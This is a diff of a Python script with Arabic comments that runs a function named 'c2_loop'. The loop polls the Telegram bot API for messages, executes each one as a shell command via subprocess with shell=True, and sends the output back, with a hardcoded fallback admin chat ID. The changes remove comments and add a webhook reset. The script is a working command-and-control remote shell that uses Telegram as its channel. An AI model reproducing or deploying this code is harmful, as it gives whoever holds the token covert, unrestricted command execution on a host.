@@ -5,13 +5,12 @@ import requests
 import threading
 from flask import Flask
 
-# جلب التوكن ومعرف الأدمن من متغيرات البيئة في Render تلقائياً
 TOKEN = os.environ.get("TELEGRAM_TOKEN")
 admin_env = os.environ.get("ADMIN_CHAT_ID")
 ADMIN_ID = int(admin_env) if admin_env and admin_env.isdigit() else 2086562822
 
 URL = f"https://api.telegram.org/bot{TOKEN}"
-CWD = os.getcwd()       # مجلد العمل الحالي على سيرفر Render
+CWD = os.getcwd()
 ALIVE = True
 
 app = Flask(__name__)
@@ -55,7 +54,6 @@ def exec_cmd(cmd):
             ALIVE = False
             return "تم إيقاف العملية."
 
-        # تنفيذ الأمر على نظام التشغيل السحابي (Linux)
         proc = subprocess.run(cmd, shell=True, capture_output=True,
                               text=True, cwd=CWD, timeout=120)
         return (proc.stdout + proc.stderr) or "تم بنجاح (لا مخرجات)."
@@ -101,6 +99,12 @@ def handle(chat_id, user_id, msg):
 
 def c2_loop():
     global ALIVE, CWD
+    # إلغاء أي Webhook قديم فَعّله تليجرام لكي يعمل النظام بنجاح
+    try:
+        requests.get(f"{URL}/deleteWebhook")
+    except Exception:
+        pass
+
     offset = None
     while ALIVE:
         data = get_updates(offset)
@@ -116,9 +120,7 @@ def c2_loop():
         time.sleep(2)
 
 if __name__ == "__main__":
-    # تشغيل حلقة الاستطلاع في الخلفية (Background Thread)
     threading.Thread(target=c2_loop, daemon=True).start()
     
-    # تشغيل خادم Flask لفتح المنفذ وإرضاء منصة Render
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
